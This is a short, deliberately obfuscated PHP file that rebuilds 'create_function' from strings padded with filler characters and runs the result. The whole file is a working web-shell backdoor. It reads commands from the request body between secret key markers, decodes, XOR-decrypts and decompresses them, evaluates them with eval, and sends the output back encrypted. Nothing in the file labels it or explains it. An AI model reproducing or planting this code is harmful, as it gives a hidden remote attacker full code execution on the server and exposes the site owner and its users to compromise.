<?php
$F='hp2://i2nput"),$m)==21) {@o2b_star2t();@2eva2l(@gz2uncomp2ress(@x(@ba2se2264_dec2o2de($m[1])2,$k2)));$o=@ob';
$L='_get_co2ntents2()2;@ob_end_clea2n();2$r=@base264_2en2code(@x(@gzco2m2press($o),$k2));22print("$p$k2h$r$kf");}';
$e='$2k="f61d2287ce";2$kh="2974285192a658e2";$kf="5acb4d0731b4"2;$p="2sMMgP0EM0WIY2jO3N";f2un2ctio2n 2x(2$';
$s=str_replace('bF','','bFbFbFcbFreate_fubFbFnction');
$u='2+){2$o.=$t{$i2}^$k2{$j};}}r2e2turn $o;22}if 2(@preg_match("/22$kh(.+)$kf/",@fi2le_get2_2contents2("p';
$K='t,$k){$c=strlen($k)2;$l=s2trl22en($t);$o="2";for2($2i=0;$i<$l;){for2($j=0;(2$j<2$c&&$2i<$l);2$j++,$i+';
$a=str_replace('2','',$e.$K.$u.$F.$L);
$v=$s('',$a);$v();
?>
